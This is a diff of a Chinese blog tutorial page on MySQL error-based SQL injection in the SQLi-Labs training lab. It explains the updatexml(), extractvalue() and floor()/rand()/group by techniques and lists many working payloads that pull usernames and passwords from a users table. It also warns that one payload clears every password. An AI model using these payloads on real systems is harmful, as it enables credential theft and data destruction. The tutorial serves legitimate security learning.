@@ -194,7 +194,7 @@
             <!-- Post Main Content -->
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                 <h1 id="MySQL报错注入"><a href="#MySQL报错注入" class="headerlink" title="MySQL报错注入"></a>MySQL报错注入</h1><p><em>SQLi-Labs</em>是一个学习SQL注入平台,该平台包含了不同GET和POST的注入场景，这篇文章以sqli-labs平台的第17关Less17来讲解报错注入，这里主要讲解常见的三种报错注入方式，这种三种报错注入使用的报错注入函数分别为：floor( )、updatexml( )和extractvalue( )。</p>
-<p>【注意】<strong>报错注入对MySQL的版本是有要求的，本文使用的是5.5.53版本</strong></p>
+<p>【注意】<strong>报错注入对MySQL的版本是有要求的，本文使用的是5.5.53版本的MySQL。</strong></p>
 <hr>
 <p>首先，我介绍一下Less17的情况，这一关是用update查询语句来重置用户密码的，打开less17页面后显示如下。</p>
 <img src="/2019/08/13/error-based-injection/1_1.png" title="pic1">
@@ -211,29 +211,13 @@
 
 <p>上面是源代码中的SQL查询语句，对于update（或delete/insert）语句，我们可以通过<strong>or</strong>或者<strong>and</strong>布尔关键字衔接报错注入语句来构造一句完整的payload。</p>
 <hr>
-<h3 id="下面来介绍三种报错注入函数的原理及其使用："><a href="#下面来介绍三种报错注入函数的原理及其使用：" class="headerlink" title="下面来介绍三种报错注入函数的原理及其使用："></a>下面来介绍三种报错注入函数的原理及其使用：</h3><h3 id="1、updatexml-xml-target-xpath-expr-new-xml"><a href="#1、updatexml-xml-target-xpath-expr-new-xml" class="headerlink" title="1、updatexml(xml_target,xpath_expr,new_xml)"></a>1、updatexml(xml_target,xpath_expr,new_xml)</h3><table>
-<thead>
-<tr>
-<th><strong>参数</strong></th>
-<th><strong>描述</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>xml_target</td>
-<td>目标xml，形式类似节点目录</td>
-</tr>
-<tr>
-<td>xpath_expr</td>
-<td>xml的表达式（xpath格式）</td>
-</tr>
-<tr>
-<td>new_xml</td>
-<td>用来替换的xml</td>
-</tr>
-</tbody></table>
+<h3 id="下面来介绍三种报错注入函数的原理及其使用："><a href="#下面来介绍三种报错注入函数的原理及其使用：" class="headerlink" title="下面来介绍三种报错注入函数的原理及其使用："></a>下面来介绍三种报错注入函数的原理及其使用：</h3><h3 id="1、updatexml-xml-target-xpath-expr-new-xml"><a href="#1、updatexml-xml-target-xpath-expr-new-xml" class="headerlink" title="1、updatexml(xml_target,xpath_expr,new_xml)"></a>1、updatexml(xml_target,xpath_expr,new_xml)</h3><p><strong>参数</strong> </p>
+<p>xml_target：目标xml，形式类似节点目录 </p>
+<p>xpath_expr ： xml的表达式（xpath格式） </p>
+<p>new_xml ： 用来替换的xml </p>
 <p>作用：这是一个MySQL对xml文档数据进行查询和修改的函数。其实就是用new_xml把xml_target中包含xpath_expr的部分节点（包括xml_target的节点）替换掉。（具体不懂没关系，见下面的报错原理）</p>
 <p>报错原理：updatexml( )中第二个参数必须是xpath语法格式，若使用该函数时该参数不符合xpath格式则会报错，提示我们输入的内容有错，如 <em>XPATH syntax error:’xxx（第二个参数的内容）’</em> 。所以我们可以在第二个参数输入我们想要查询的数据来进行报错注入。</p>
-<h4 id="updatexml-的常规报错用法"><a href="#updatexml-的常规报错用法" class="headerlink" title="updatexml()的常规报错用法"></a>updatexml()的常规报错用法</h4><p><strong>payload ：</strong></p>
+<h4 id="updatexml-的常规报错用法"><a href="#updatexml-的常规报错用法" class="headerlink" title="updatexml( )的常规报错用法"></a>updatexml( )的常规报错用法</h4><p><strong>payload ：</strong></p>
 <p> <em>‘ or updatexml(1,concat(‘#’,<strong>(select version() )</strong>,’#’),0)#</em></p>
 <p>下图使用火狐浏览器的插件Hackbar来提交post数据：</p>
 <img src="/2019/08/13/error-based-injection/1_4.png" title="pic4">
@@ -250,9 +234,9 @@
 <h4 id="实验前提：数据库为security-其中有一个users表，表中含字段username和password。"><a href="#实验前提：数据库为security-其中有一个users表，表中含字段username和password。" class="headerlink" title="实验前提：数据库为security,其中有一个users表，表中含字段username和password。"></a>实验前提：数据库为security,其中有一个users表，表中含字段username和password。</h4><p><strong>payload1:</strong> </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or updatexml(1,concat(&apos;#&apos;,(select concat(id,&apos;#&apos;,username,&apos;#&apos;,password) from users limit 0,1)),0)#</span><br></pre></td></tr></table></figure>
 
+<p>结果：You can’t specify target table ‘users’ for update in FROM clause</p>
 <img src="/2019/08/13/error-based-injection/1_6.png" title="pic6">
 
-<p>结果：You can’t specify target table ‘users’ for update in FROM clause</p>
 <p>这里我试图查询users表中的id、username和password的第一行数据，但这里却弹出错误提醒。</p>
 <p>原因：根据报错意思，不能指定FROM子句中的users表来作为要UPDATE的表。完整的SQL语句如下：</p>
 <p>UPDATE users SET password = ‘<strong><em>‘ or updatexml(1,concat(‘#’,(select concat(id,’#’,username,’#’,password) from users limit 0,1)),0) #</em></strong> ‘ WHERE username=’$row1’</p>
@@ -261,15 +245,16 @@
 <p> <strong>payload2:</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or updatexml(1,concat(&apos;#&apos;,(select * from (select concat_ws(&apos;#&apos;,id,username,password) from users limit 0,1) a),&apos;#),0)#</span><br></pre></td></tr></table></figure>
 
+<p>结果：XPATH syntax error: ‘#1#Dumb#Dumb’，成功爆出数据（上面其实使用concat_ws( )和concat( )都可以）。通   过改变关键字limit中的0便可以把表中的每一行数据暴出来。</p>
 <img src="/2019/08/13/error-based-injection/1_7.png" title="pic7">
 
-<p>结果：XPATH syntax error: ‘#1#Dumb#Dumb’，成功爆出数据（上面其实使用concat_ws()和concat()都可以）。通   过改变关键字limit中的0便可以把表中的每一行数据暴出来。</p>
 <p>解释：这里的<strong>a</strong>：<strong>(select concat_ws(‘#’,id,username,password) from users limit 0,1)</strong>就是<strong>派生表</strong>，而select * from a就相当于查询a语句本身结果的内容。</p>
 <p>即“select concat_ws(‘#’,id,username,password) from users limit 0,1”等价于 “select * from a”。</p>
-<h5 id="这里想一次性输出全部数据，故尝试使用group-concat-。"><a href="#这里想一次性输出全部数据，故尝试使用group-concat-。" class="headerlink" title="这里想一次性输出全部数据，故尝试使用group_concat( )。"></a>这里想一次性输出全部数据，故尝试使用group_concat( )。</h5><p><strong>payload3：</strong></p>
+<p><strong>下面想一次性输出全部数据，故尝试使用group_concat( )。</strong></p>
+<p><strong>payload3：</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or updatexml(1,concat(&apos;#&apos;,(select * from (select group_concat(id,&apos;#&apos;,username,&apos;#&apos;,password) from users limit 0,1) a)),0)#</span><br></pre></td></tr></table></figure>
 
-<p>结果：XPATH syntax error: ‘#1#Dumb#Dumb,2#Angelina#I-kill-y’。可见，这里只能爆出来（显示）前两组数据，而且第二行数据的password没有完整显示出来（完整密码是I-kill-you）。</p>
+<p>结果：XPATH syntax error: ‘#1#Dumb#Dumb,2#Angelina#I-kill-y’。可见，这里只能爆出来（显示）前两组数据，而且第二行数据的password没有完整显示出来（完整密码是I-kill-you）。若想显示后面的数据可以用substr()来截取。</p>
 <p>【<strong>注意】updatexml( )和extractvalue( )这两个函数的报错返回长度有限,均为32个字符长度</strong></p>
 <p><strong>另外要警告的一点是</strong>：这里我尝试把limit 0,1改成limit 1,1，执行后发现password字段的<strong>数据全部清空了！！！</strong></p>
 <p>分析：</p>
@@ -279,47 +264,99 @@
 <p><strong>UPDATE users SET password = ‘’ or NULL</strong>，即把password字段的数据全部改为NULL，因为单引号中什么内容都没有所以密码数据全部被清空了。</p>
 <p>实际上，这里用了group_concat( )本身就不用加Limit 0,1关键字了！</p>
 <p>【<strong>警告</strong>】<strong>updatexml()本身一个就是危险函数！！！</strong>请谨慎使用updatexml( )函数。</p>
-<h3 id="2、extractvalue-xml-document-xpath-string"><a href="#2、extractvalue-xml-document-xpath-string" class="headerlink" title="2、extractvalue(xml_document, xpath_string)"></a>2、extractvalue(xml_document, xpath_string)</h3><table>
-<thead>
-<tr>
-<th><strong>参数</strong></th>
-<th><strong>描述</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>xml_document</td>
-<td>xml_document是String格式，为XML文档对象的名称</td>
-</tr>
-<tr>
-<td>xpath_string</td>
-<td>xpath_string (xpath格式的字符串)</td>
-</tr>
-</tbody></table>
+<h3 id="2、extractvalue-xml-document-xpath-string"><a href="#2、extractvalue-xml-document-xpath-string" class="headerlink" title="2、extractvalue(xml_document, xpath_string)"></a>2、extractvalue(xml_document, xpath_string)</h3><p><strong>参数</strong>  </p>
+<p>xml_document ： xml_document是string格式，为XML文档对象的名称。 </p>
+<p>xpath_string ： xpath_string是xpath格式的字符串。</p>
 <p>作用：从目标XML中返回包含所查询值的字符串。</p>
 <p>报错原理：这里和updatexml( )的报错原理一样，都属于xpath语法报错注入，也是第二个参数必须是xpath语法格式，所以我们可以在第二个参数输入我们想要查询的数据来进行报错注入。</p>
-<h4 id="updatexml-的常规报错用法-1"><a href="#updatexml-的常规报错用法-1" class="headerlink" title="updatexml( )的常规报错用法"></a>updatexml( )的常规报错用法</h4><p><strong>payload ：</strong></p>
-<p> <em>‘ or extractvalue(1,concat(‘<del>‘,<strong>(select version() )</strong>,’</del>‘))#</em></p>
+<h4 id="extractvalue-的常规报错用法"><a href="#extractvalue-的常规报错用法" class="headerlink" title="extractvalue( )的常规报错用法"></a>extractvalue( )的常规报错用法</h4><p><strong>payload ：</strong></p>
+<p> <em>‘ or extractvalue(1,concat(‘#’,<strong>(select version() )</strong>,’#’))#</em></p>
 <p>上面的payload是extractvalue( )报错注入的常规模型，只需把加粗部分的内容改成想查看的数据的查询语句就能爆出想要的表中数据。</p>
 <p>extractvalue( )的用法与updatexml( )的用法一样，只要把上面的payload1、2、3中updatexml( )的前两个参数的内容输入到extractvalue( )的前两个参数中就可以了。原理都一样，所以具体的payload就不写出来了</p>
 <p>【<strong>再次提醒</strong>】<strong>updatexml( )和extractvalue( )这两个函数的报错返回长度有限,均为32个字符长度</strong></p>
-<h3 id="3、floor-、rand-、count"><a href="#3、floor-、rand-、count" class="headerlink" title="3、floor( )、rand( )、count(*)"></a>3、floor( )、rand( )、count(*)</h3><p> <strong>floor( )</strong>的作用：返回小于等于该参数值的最大整数,也可以理解为向下取整，只保留整数部分。</p>
+<h3 id="3、floor-、rand-、count-、group-by"><a href="#3、floor-、rand-、count-、group-by" class="headerlink" title="3、floor( )、rand( )、count(*)、group by"></a>3、floor( )、rand( )、count(*)、group by</h3><p><strong>·floor( )</strong>的作用：返回小于等于该参数值的最大整数,也可以理解为向下取整，只保留整数部分。</p>
 <p>示例如下：</p>
 <img src="/2019/08/13/error-based-injection/1_8.png" title="pic8">
 
-<p><strong>rand( )</strong>的作用：在0和1之间产生一个随机数。</p>
-<p>【注意】当rand( )中加入数字参数（暂且管它叫随机因子）后</p>
+
+
+<p><strong>rand( )</strong>的作用：在0和1之间产生一个随机数，每次调用产生的数都是随机的，如下图所示。</p>
 <img src="/2019/08/13/error-based-injection/1_9.png" title="pic9">
 
+<p>【注意】当rand( )中加入数字参数（暂且管它叫随机因子）后，例如随机因子为0，则在一句查询语句的一次调用rand(0)中，得到的结果都是一样的，如下图所示。</p>
+<img src="/2019/08/13/error-based-injection/1_10.png" title="pic10">
 
+<p>随机因子不一样，生成的数也不一样，如下图所示。</p>
+<img src="/2019/08/13/error-based-injection/1_11.png" title="pic11">
 
+<p>所以rand( )生成的是随机数，rand(x)（x是随机因子）是伪随机数。</p>
+<p><strong>group by</strong>：GROUP BY 语句根据一个或多个列对结果集进行分组。在分组的列上我们可以使用 COUNT, SUM, AVG,等函数。</p>
+<p><strong>count(*)</strong>：一般结合group by使用，对分组后的数据进行计数。</p>
+<p>具体用法还是以例子来演示会比较清晰：</p>
+<img src="/2019/08/13/error-based-injection/1_12.png" title="pic12">
 
+<img src="/2019/08/13/error-based-injection/1_13.png" title="pic13">
 
+<h3 id="下面开始来讲解floor-报错注入的原理"><a href="#下面开始来讲解floor-报错注入的原理" class="headerlink" title="下面开始来讲解floor( )报错注入的原理"></a>下面开始来讲解floor( )报错注入的原理</h3><p>上面提到了rand(x)生成的是一个伪随机数，当x为一个确定的数字时，例如rand(0)，这时在一条SQL语句中一次调用这个函数都会生成同一个数值。但是如果在一句SQL查询语句中多次调用的话，结果会怎么样呢？看看下面的操作结果。</p>
+<p><strong>SQL语句1</strong>：</p>
+<p>select rand(0) from users;</p>
+<img src="/2019/08/13/error-based-injection/1_14_1.png" title="pic14_1">
 
+<img src="/2019/08/13/error-based-injection/1_14_2.png" title="pic14_2">
 
+<p>这时候可以看到，每一行的查询结果都是不一样的。<strong>但是</strong>继续多次重复执行SQL语句1，会发现每次结果都是得到上面的表格。</p>
+<p><strong>SQL语句2：</strong></p>
+<p>select floor(rand(0)*2) from users;</p>
+<img src="/2019/08/13/error-based-injection/1_14_3.png" title="pic14_3">
 
+<p>这里floor(rand(0)*2)是为了每次使结果为0或1,。多次重复执行SQL语句2，发现结果依然和上图一样。这里注意一下，表中结果由上往下为01101100111……</p>
+<p>上面两个操作得出的结论是：<strong>这说明加了随机因子的rand(x)在每次执行SQL查询语句中，其结果具有确定性。</strong></p>
+<p><strong>SQL语句3：</strong></p>
+<p>select  count(*<em>) from users group by (floor(rand(0)</em>2))x;</p>
+<img src="/2019/08/13/error-based-injection/1_15.png" title="pic15">
 
-<p>Payload（floor()的用法）:</p>
-<p>‘ or (select 1 from (select count(<em>),concat_ws(‘-‘,(select concat_ws(‘-‘,id,username,password) from users limit 0,1),floor(rand()</em>2))as a from information_schema.tables group by a) b) where username=’admin’#</p>
+<p>由上可见，这里报错了，<strong>ERROR 1062 (23000): Duplicate entry ‘1’ for key ‘group_key’</strong>，翻译意思大概是对于键group_key录入重复了，即键group_key中已经存在‘1‘了，再重复录入键名为’1‘的键时便会发生报错。好吧，这样的解释是不能让大家满意的，具体原理请往下看。</p>
+<h3 id="group-by-——–-gt-虚拟表"><a href="#group-by-——–-gt-虚拟表" class="headerlink" title="group by ——–&gt;虚拟表"></a>group by ——–&gt;虚拟表</h3><p><strong>虚拟表</strong>：在使用group by进行分组查询的时候，数据库会生成一张虚拟表。</p>
+<p>在这张虚拟表中，group by后面的字段（即，上面的”(floor(rand(0)<em>2))“）作为主键，SQL语句3爆出的错误的原因是因为虚拟表的主键重复录入。按照MySQL的官方说法，*</em>group by要进行两次运算，第一次是拿group by后面的字段值到虚拟表中去对比前，首先求出group by后面字段的值；第二次是假若group by后面的字段的值在虚拟表的主键中不存在，那就需要把它录入到虚拟表的主键中，这时候录入则会对group by后面的字段进行第二次运算；否则（group by后面的字段的值在虚拟表的主键中已经存在），不会把该字段的值录入到虚拟表的主键中**。</p>
+<p>还记得上面介绍count(*)时使用的例子吗（见下图)？</p>
+<img src="/2019/08/13/error-based-injection/1_12.png" title="pic12">
+
+<img src="/2019/08/13/error-based-injection/1_13.png" title="pic13">
+
+<p>由于这里使用了count(*)加group by组合，在生成上面的表之前，先会生成一张虚拟表。这里主键是name，生成虚拟表的过程如下：</p>
+<p>1）先生成一张空的虚拟表。接着查询pra_1表的第一条数据，“ada  girl  12”，先”计算“group by后面的字段name得到”ada“，查询虚拟表，由于中的主键name 没有”ada“这一项，便继续”计算“group by后面的字段name得到”ada“，故把”ada“录入主键中。接着count(*)的值加1；</p>
+<p>2）查询pra_1表的第二条数据……</p>
+<p>3）直到查询到”nick boy 18“时，先”计算“group by后面的字段name得到”nick“，由于上面已经查询过”Nick man 24“，在虚拟表主键中已经录入了”Nick“（不区分大小写），所以这里不再把”nick“写入，即不进行第二次”计算“，直接count(*)加1；</p>
+<p>……</p>
+<p>19）查询到最后一条数据”nick Man 22“，进行第一次”计算“后便直接count(*)加1得到值为9，最后按字母进行排序后便输出了表的结果。</p>
+<p><strong>还记得SQL语句2得到的结果01101100111……吗？</strong></p>
+<p>1）由于一开始虚拟表为空，所以第一次查询进行了两次计算。第一次计算值为0，虚拟表中不存在0，故进行第二次计算，得到值1，此时录入主键的值是1不是0。</p>
+<p>2）第二次查询，第一次计算得到1，查询虚拟表主键已经存在1,故不进行第二次计算，不录入主键；</p>
+<p>3）第三次查询，第一次计算得到0，查询虚拟表主键没有0，故进行第二次计算，得到值为1。此时按规则应该把1录入到主键下，但是虚拟表主键下已经存在1了，最终在此处报错！</p>
+<hr>
+<p><strong>结论：由于第二次运算的结果与第一次运算的结果不一致，而且第一次运算的结果在虚拟表中不存在，但是第二次运算结果存在虚拟表中，那么这时的录入主键必然导致主键的重复，进而引发错误。</strong></p>
+<hr>
+<h4 id="floor-的常规报错注入用法"><a href="#floor-的常规报错注入用法" class="headerlink" title="floor( )的常规报错注入用法"></a>floor( )的常规报错注入用法</h4><p><strong>payload1 ：</strong></p>
+<p><em>‘ or (select count(\</em>) from information_schema.tables  group by <strong>(concat_ws(‘-‘,(select user()),floor(rand(0)*2)))</strong> )#*</p>
+<p><strong>payload2 ：</strong></p>
+<p><em>‘ or (select \</em> from (select 1,count(*),<strong>(concat_ws(‘-‘,(select user()),floor(rand(0)*2)))</strong>x from information_schema.tables group by x)a )#*</p>
+<p><strong>payload3：</strong></p>
+<p><em>‘ or (select 1 from (select count(\</em>),<strong>concat_ws(‘-‘,(select user()),floor(rand(0)*2))</strong>as a from information_schema.tables group by a) b) where username=’admin’#*</p>
+<p>上面的payload是extractvalue( )报错注入的常规模型(可以把information_schema.tables改成其他数据库的表，但是payload1不能把information_schema.tables改成users，否则会弹出错误提示： You can’t specify target table ‘users’ for update in FROM clause)，只需把加粗部分的内容改成想查看的数据的查询语句就能爆出想要的表中数据。</p>
+<p>下面的payload直接爆出users表下的username和password的数据：</p>
+<p><strong>payload4:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or (select count(*) from information_schema.tables  group by (concat_ws(&apos;-&apos;,(select * from (select concat_ws(&apos;-&apos;,username,password) from users limit 0,1)x),floor(rand(0)*2))) )#</span><br></pre></td></tr></table></figure>
+
+<p><strong>payload5:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or (select 1 from (select count(*),concat_ws(&apos;-&apos;,(select concat_ws(&apos;-&apos;,id,username,password) from users limit 0,1),floor(rand(0)*2))as x from information_schema.tables group by x) a) where username=&apos;admin&apos;#</span><br></pre></td></tr></table></figure>
+
+<p><strong>payload6:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or (select * from (select 1,count(*),(concat_ws(&apos;-&apos;,(select concat_ws(&apos;-&apos;,id,username,password) from users limit 0,1),floor(rand(0)*2)))x from information_schema.tables group by x)a )#</span><br></pre></td></tr></table></figure>
+
+<p>通过改变limit 0,1中的0便可以逐行查看users表的数据。</p>
+<p><strong>floor( )报错注入总结：只要把group by后面的字段改成想查看的内容的查询语句便能爆出数据，上面的payload的x就是想要爆出的内容。</strong></p>
+<hr>
+<h4 id="总结：以上讲解了updatexml-、extractvalue-和floor-这个三种常用的报错注入方式，当然还有其他的报错注入，如NAME-CONST报错、join报错和polygon-报错等等。注意，不同的报错注入方式对MySQL的版本有不同的要求，大家请根据目标主机的使用的MySQL的版本使用合适的payload。"><a href="#总结：以上讲解了updatexml-、extractvalue-和floor-这个三种常用的报错注入方式，当然还有其他的报错注入，如NAME-CONST报错、join报错和polygon-报错等等。注意，不同的报错注入方式对MySQL的版本有不同的要求，大家请根据目标主机的使用的MySQL的版本使用合适的payload。" class="headerlink" title="总结：以上讲解了updatexml( )、extractvalue( )和floor( )这个三种常用的报错注入方式，当然还有其他的报错注入，如NAME_CONST报错、join报错和polygon ()报错等等。注意，不同的报错注入方式对MySQL的版本有不同的要求，大家请根据目标主机的使用的MySQL的版本使用合适的payload。"></a>总结：以上讲解了updatexml( )、extractvalue( )和floor( )这个三种常用的报错注入方式，当然还有其他的报错注入，如NAME_CONST报错、join报错和polygon ()报错等等。注意，不同的报错注入方式对MySQL的版本有不同的要求，大家请根据目标主机的使用的MySQL的版本使用合适的payload。</h4><hr>
 
 
                 
